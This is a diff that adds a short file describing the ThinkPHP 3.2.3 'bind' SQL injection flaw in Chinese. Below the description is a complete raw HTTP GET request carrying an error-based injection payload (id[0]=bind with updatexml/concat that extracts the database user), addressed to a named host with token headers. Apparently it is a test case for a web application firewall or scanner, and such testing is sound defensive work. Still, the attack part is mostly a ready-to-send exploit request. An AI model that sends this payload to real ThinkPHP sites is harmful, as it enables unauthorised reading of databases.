@@ -1,0 +1,11 @@
+# ThinkPHP3.2.3 bind注入漏洞
+# ThinkPHP是由上海顶想公司开发维护的MVC结构的开源PHP框架。
+# 
+# 在框架的安全数据库实现中，存在一个潜在的安全风险，即在进行数据更新（update）时，使用了 SQL 语句拼接的方式。特别是在传入的数组数据没有经过充分过滤的情况下，导致存在 SQL 注入漏洞。
+GET /index.php?acid=80047095&id=id%5B0%5D=bind&id%5B1%5D=0%20and%20updatexml%281%2Cconcat%280x7e%2Cuser%28%29%2C0x7e%29%2C1%29&password=1&bid=hd_tag_m8mv25kb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25kb
+RM-PRO-Token: aeed3e49749962f5c3ac539a421db312
+RM-PRO-Time: 1742808475856
+User-Agent: curl/7.83.1
+
